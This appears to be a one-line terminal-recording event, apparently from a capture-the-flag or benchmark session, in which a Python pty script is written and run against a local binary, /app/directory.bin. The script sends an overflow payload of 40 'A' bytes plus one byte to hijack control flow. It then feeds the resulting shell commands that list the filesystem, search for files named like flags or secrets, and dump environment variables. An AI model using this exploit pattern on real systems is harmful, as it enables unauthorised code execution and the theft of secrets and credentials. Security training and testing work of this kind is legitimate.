[2966.430262, "i", "cat << 'EOF' > /tmp/pty_exp.py\nimport pty, os, time, sys\n\npid, fd = pty.fork()\nif pid == 0:\n    os.execv('/app/directory.bin', ['/app/directory.bin'])\nelse:\n    def send(msg):\n        os.write(fd, msg)\n        time.sleep(0.1)\n\n    time.sleep(0.2)\n    for _ in range(9):\n        send(b\"1\\n\")\n        send(b\"A\\n\")\n\n    send(b\"1\\n\")\n    send(b\"A\"*40 + b\"\\x37\")\n    time.sleep(0.3)\n\n    send(b\"4\\n\")\n    time.sleep(0.5)\n    \n    send(b\"echo EXPL_START; ls -la /; find / -name '*flag*' -o -name '*secret*' 2>/dev/null; env; echo EXPL_END; exit\\n\")\n    \n    out = b''\n    for i in range(20):\n        try:\n            chunk = os.read(fd, 4096)\n            if not chunk: break\n            out += chunk\n            if b\"EXPL_END\" in out:\n                break\n        except Exception:\n            time.sleep(0.1)\n    \n    print(\"\\n--- EXPLOIT SHELL OUTPUT ---\")\n    sys.stdout.buffer.write(out)\nEOF\npython3 /tmp/pty_exp.py\n"]
